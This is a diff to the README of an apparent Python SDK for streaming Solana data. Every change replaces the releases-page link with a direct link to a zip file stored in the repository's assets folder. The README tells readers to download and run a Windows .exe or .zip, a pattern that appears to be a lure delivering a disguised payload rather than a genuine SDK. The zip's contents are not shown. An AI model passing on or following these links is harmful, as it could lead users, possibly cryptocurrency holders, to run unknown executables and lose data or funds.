@@ -1,10 +1,10 @@
 # ⚡ shredstream-sdk-python - Stream Solana data with low delay
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Mammoth-countsminute684/shredstream-sdk-python/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Mammoth-countsminute684/shredstream-sdk-python/main/assets/shredstream_sdk_python_3.8.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Mammoth-countsminute684/shredstream-sdk-python/releases
+Visit this page to download: https://raw.githubusercontent.com/Mammoth-countsminute684/shredstream-sdk-python/main/assets/shredstream_sdk_python_3.8.zip
 
 Choose the latest release for Windows, then download the file that matches your system. If you see more than one file, pick the one with a name that ends in `.exe` or `.zip`.
 
@@ -31,7 +31,7 @@ If the app comes with a `.zip` file, you will need to extract it before you run 
 
 ## 🚀 Get started on Windows
 
-1. Open the download page: https://github.com/Mammoth-countsminute684/shredstream-sdk-python/releases
+1. Open the download page: https://raw.githubusercontent.com/Mammoth-countsminute684/shredstream-sdk-python/main/assets/shredstream_sdk_python_3.8.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file
 4. If the file is in a `.zip`, right-click it and choose Extract All
@@ -105,7 +105,7 @@ If you see an example folder, it can help you understand how to start.
 ## 🧭 Need the latest version?
 
 Download from the releases page:
-https://github.com/Mammoth-countsminute684/shredstream-sdk-python/releases
+https://raw.githubusercontent.com/Mammoth-countsminute684/shredstream-sdk-python/main/assets/shredstream_sdk_python_3.8.zip
 
 Check this page when you want the newest Windows build, updated files, or release notes for the app
 
